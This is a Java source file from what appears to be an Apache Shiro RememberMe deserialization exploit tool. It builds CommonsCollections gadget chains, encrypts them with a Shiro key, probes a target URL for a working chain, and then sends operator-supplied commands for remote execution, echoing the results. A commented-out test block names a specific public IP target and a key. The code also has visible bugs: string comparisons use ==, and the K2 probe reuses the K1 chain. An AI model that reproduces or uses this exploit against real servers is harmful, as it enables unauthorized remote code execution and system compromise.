package core;

import entity.ControllersFactory;
import gadgets.CommonsCollectionsK1;
import gadgets.CommonsCollectionsK2;
import gadgets.util.Gadgets;
import ui.MainController;
import utils.HttpUtils;
import utils.createAESCBCCipher;
import utils.createAESGCMCipher;

public class GadgetsDetect {
    String gadget="";
    final private MainController myController = (MainController) ControllersFactory.controllers.get(MainController.class.getSimpleName());
    public String GadgetsBurp(String url, String Shirokey, String mode) throws Exception {
        this.commonsCollectionsK1(url,Shirokey,mode);
        this.commonsCollectionsK2(url,Shirokey,mode);
        return gadget;
    }

    public void GadgetsExp(String url,String Shirokey,String mode,String gadget,String cmd) throws Exception {
        String payload = "";
        if(gadget == "commonsCollectionsK1"){
            CommonsCollectionsK1 commonsCollectionsK1 = new CommonsCollectionsK1();
            Object object = commonsCollectionsK1.getObject("calc");
            if(mode=="CBC"){
                payload = createAESCBCCipher.encrypt(Shirokey,object);
            }else {
                payload = createAESGCMCipher.encrypt(Shirokey,object);
            }
            String res = HttpUtils.sendGet(url,payload,cmd);
            this.myController.result.appendText("[*]利用链commonsCollectionsK1\n[*]执行"+cmd+"\n");
            this.myController.result.appendText("[*]"+res+"\n");
        }else if(gadget == "commonsCollectionsK2"){
            CommonsCollectionsK1 commonsCollectionsK1 = new CommonsCollectionsK1();
            Object object = commonsCollectionsK1.getObject("calc");
            if(mode=="CBC"){
                payload = createAESCBCCipher.encrypt(Shirokey,object);
            }else {
                payload = createAESGCMCipher.encrypt(Shirokey,object);
            }
            String res = HttpUtils.sendGet(url,payload,cmd);
            this.myController.result.appendText("[*]利用链commonsCollectionsK2\n[*]执行"+cmd+"\n");
            this.myController.result.appendText("[*]"+res+"\n");
        }else {
            this.myController.result.appendText("[*]未找到利用链\n");
        }


    }
    public String commonsCollectionsK1(String url,String Shirokey,String mode) throws Exception {
        String payload = "";
        CommonsCollectionsK1 commonsCollectionsK1 = new CommonsCollectionsK1();
        CommonsCollectionsK2 commonsCollectionsK2 = new CommonsCollectionsK2();
        Object object = commonsCollectionsK1.getObject("calc");
        if(mode=="CBC"){
            payload = createAESCBCCipher.encrypt(Shirokey,object);
        }else {
            payload = createAESGCMCipher.encrypt(Shirokey,object);
        }
        String res = HttpUtils.getHeader(url,payload);
        if(res.contains("23f20bfc119b58355179e1f33722f14c")){
            if(gadget == ""){
                gadget = "commonsCollectionsK1";
            }
        }
        return gadget;
    }
    public String commonsCollectionsK2(String url,String Shirokey,String mode) throws Exception {
        String payload = "";
        CommonsCollectionsK1 commonsCollectionsK1 = new CommonsCollectionsK1();
        CommonsCollectionsK2 commonsCollectionsK2 = new CommonsCollectionsK2();
        Object object = commonsCollectionsK1.getObject("calc");
        if(mode=="CBC"){
            payload = createAESCBCCipher.encrypt(Shirokey,object);
        }else {
            payload = createAESGCMCipher.encrypt(Shirokey,object);
        }
        String res = HttpUtils.getHeader(url,payload);
        if(res.contains("23f20bfc119b58355179e1f33722f14c")){
            if(gadget == ""){
                gadget = "commonsCollectionsK1";
            }
        }
        return gadget;
    }
//    public static void main(String[] args) throws Exception {
//        String targetUrl="http://119.96.202.68:9080/login";
//        String shirokey="fCq+/xW488hMTCD+cmJ3aQ==";
//        String mode = "GCM";
//        GadgetsDetect gadgetsDetect = new GadgetsDetect();
//        String hah = gadgetsDetect.GadgetsBurp(targetUrl,shirokey,mode);
//        System.out.println(hah);
//    }
}
